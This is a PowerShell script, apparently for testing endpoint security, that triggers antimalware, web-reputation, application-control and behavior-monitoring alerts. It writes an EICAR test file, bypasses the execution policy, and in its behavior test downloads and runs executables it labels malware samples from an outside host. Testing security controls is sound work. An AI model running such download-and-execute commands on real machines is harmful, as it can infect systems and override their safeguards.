Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

$menu = @"
Select a test to run:
1. Generate Antimalware Alert
2. Generate Web Reputation Alert
3. Generate Application Control Alert
4. Generate Behavior Monitoring Alert
5. Exit and Clean Up Changes
"@

function Generate-AntimalwareAlert {
    $eicarBytes = [byte[]] (
        0x58, 0x35, 0x4F, 0x21, 0x50, 0x25, 0x40, 0x41, 0x50, 0x5B, 0x34, 0x5C, 0x50, 0x5A, 0x58, 0x35,
        0x34, 0x28, 0x50, 0x5E, 0x29, 0x37, 0x43, 0x43, 0x29, 0x37, 0x7D, 0x24, 0x45, 0x49, 0x43, 0x41,
        0x52, 0x2D, 0x53, 0x54, 0x41, 0x4E, 0x44, 0x41, 0x52, 0x44, 0x2D, 0x41, 0x4E, 0x54, 0x49, 0x56,
        0x49, 0x52, 0x55, 0x53, 0x2D, 0x54, 0x45, 0x53, 0x54, 0x2D, 0x46, 0x49, 0x4C, 0x45, 0x21, 0x24,
        0x48, 0x2B, 0x48, 0x2A
    )
    [System.IO.File]::WriteAllBytes("eicar_test.com", $eicarBytes)
    Write-Host "EICAR test file created: eicar_test.com"
    Start-Sleep -Seconds 5
    Remove-Item -Path "eicar_test.com" -Force -ErrorAction SilentlyContinue
}

function Generate-WebReputationAlert {
    $url = "http://www.amtso.org/check-desktop-phishing-page/"
    Write-Host "Testing web reputation for: $url"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
        Write-Host "[ALERT] Page loaded successfully. Web reputation may not be blocking this URL."
    } catch {
        Write-Host "[SUCCESS] Web reputation blocked the URL: $url"
    }
}

function Generate-ApplicationControlAlert {
    Write-Host "Downloading and running WinRAR portable version..."
    $winrarPortable = "$env:TEMP\WinRARPortable.exe"
    Invoke-WebRequest -Uri "https://www.win-rar.com/fileadmin/winrar-versions/winrar-x64-621.exe" -OutFile $winrarPortable
    Start-Process -FilePath $winrarPortable -NoNewWindow -Wait
    Remove-Item -Path "$winrarPortable" -Force -ErrorAction SilentlyContinue
    Write-Host "[INFO] WinRAR Portable test complete."
}

function Generate-BehaviorMonitoringAlert {
    Write-Host "[ALERT] Downloading and executing malware samples..."
    $malwareUrls = @("https://opwise.net/p0c/hosts.exe", "https://opwise.net/p0c/startup.exe")
    foreach ($url in $malwareUrls) {
        $fileName = $url.Split('/')[-1]
        $filePath = "$env:TEMP\$fileName"
        try {
            Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing
            Write-Host "[ALERT] Downloaded $fileName successfully."
            Start-Process -FilePath $filePath -NoNewWindow -Wait
        } catch {
            Write-Host "[ERROR] Failed to download or execute $fileName. Error: $_"
        }
    }
}

function Cleanup {
    Write-Host "Reverting all changes..."
    Get-ChildItem -Path "$env:TEMP" | Where-Object { $_.Name -match "(malware_sample|hosts.exe|startup.exe|WinRARPortable.exe)" } | ForEach-Object { Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue }
    Write-Host "Cleanup complete. Exiting..."
    exit
}

while ($true) {
    Write-Host $menu
    $choice = Read-Host "Enter choice (1-5)"
    switch ($choice) {
        "1" { Generate-AntimalwareAlert }
        "2" { Generate-WebReputationAlert }
        "3" { Generate-ApplicationControlAlert }
        "4" { Generate-BehaviorMonitoringAlert }
        "5" { Cleanup }
        default { Write-Host "Invalid selection. Please choose again." }
    }
}